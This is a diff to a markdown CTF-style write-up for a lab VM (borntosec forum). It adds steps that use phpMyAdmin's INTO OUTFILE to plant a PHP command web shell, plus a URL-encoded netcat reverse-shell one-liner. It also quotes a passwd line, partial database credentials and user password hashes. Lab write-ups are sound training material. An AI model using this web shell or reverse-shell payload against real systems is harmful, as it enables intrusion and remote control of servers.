@@ -23,12 +23,12 @@ nmap -p- 192.168.1.146
 
 | Port	  | Service	| mean |
 | ----- | ----- | ----- | 
-| 21/tcp | 	FTP | File trqnsfert Protocol |
+| 21/tcp | 	FTP | File transfert Protocol |
 | 22/tcp | 	SSH | shell connection  |
 | 80/tcp | 	HTTP | website  http://192.168.1.X |
 | 143/tcp | IMAP |  email Server |
 | 443/tcp | HTTPS | website SSL |
-| 993/tcp | IMAPS | IMAP chiffré  |
+| 993/tcp | IMAPS | Encrypted IMAP |
 ---
 
 ## wesite
@@ -163,6 +163,7 @@ let's connect at the database with this informationm user = **root** pwd = ``Fg-
 
 ## https://ip/phpmyadmin
 
+
 We can update our [users informations](#users-informations) with this  localhost->forum_db->mlf2_userdata
 
 there is *user_pw*, we try to decrypt the password of lmezard because we now the **clear pwd** but we didn't found. On ``https://192.168.1.146/forum/index.php?mode=user&action=edit_profile`` we can modifie the password, that change in the DB but not for the webmail service.
@@ -170,6 +171,47 @@ there is *user_pw*, we try to decrypt the password of lmezard because we now the
 So we know the clear pwd of laurie so we can copy from the DB and paste in the pwd of **admin**
 
 Now we can connect in the forum with **admin** and the same password than **lmezzard** 
+
+----
+
+On phpmyadmin we can load file 
+
+to know where we can write the script :
+to see all the Varriables
+```SQL
+SHOW VARIABLES
+```
+or directly : 
+```SQL
+SHOW VARIABLES LIKE 'datadir/'
+```
+*response:*
+
+| Variable_name	| Value |
+|---|---|
+| datadir	| /var/lib/mysql/ |
+```SQL
+SHOW VARIABLES LIKE 'version%'
+```
+*response:*
+| Variable_name |	Value |
+| ----|----|
+| version |	5.5.44-0ubuntu0.12.04.1 |
+| version_comment |	(Ubuntu) |
+| version_compile_machine |	i686 |
+| version_compile_os |	debian-linux-gnu |
+
+Load malecious script:
+```SQL
+SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET[''cmd'']) { system($_GET[''cmd'']);} ?> </pre></BODY></HTML>'
+ INTO OUTFILE "/var/www/forum/templates_c/cmd.php"
+```
+https://192.168.1.146/forum/templates_c/cmd.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.146%2012345%20%3E%2Ftmp%2Ff
+
+Now, we can connect at https://192.168.1.146/forum/templates_c/cmd.php?cmd=id :
+
+
+ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
 
 ## Users informations
 
@@ -186,9 +228,9 @@ Now we can connect in the forum with **admin** and the same password than **lmez
 
 
 
+----------------
 
-
-
+# A supprimer Brouillon 
 https://192.168.1.146/forum/index.php
 
 "In order to log in, cookies have to be activated!"
@@ -199,3 +241,12 @@ https://192.168.1.146/forum/index.php
 	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	4	0	wandre		0	0000-00-00	f8562b53084d60efa4208fa50d1ef753ef18e089d2dd56c4ed	wandre@borntosec.net	0					1	2015-10-08 01:57:38	2015-10-08 01:58:03	192.168.1.47	2015-10-08 01:53:48	NULL	0	0	1	0	0	0	0	0						0		1,2
 	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	5	0	lmezard		0	0000-00-00	0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa1e5365dc90	laurie@borntosec.net	0					5	2026-06-18 15:34:09	2026-06-18 15:34:09	192.168.1.144	2015-10-08 01:54:38	NULL	0	0	1	0	0	0	0	0						0		8,7,5,4,3,2,6,1
 	Modifier Modifier	Modifier Éditer en place	Copier Copier	Effacer Effacer	6	0	zaz		0	0000-00-00	f10b3271bf523f12ebd58ef8581c851991bf0d4b4c4bf49d7c	zaz@borntosec.net	0	
+
+## REF
+
+- NNAP:
+	- https://nmap.org/book/port-scanning-tutorial.html
+	- https://www.varonis.com/fr/blog/nmap-commands#how-to-use
+- GOBUSTER:
+	- https://hackviser.com/tactics/tools/gobuster
+	- https://github.com/drtychai/wordlists/blob/master/dirb/common.txt
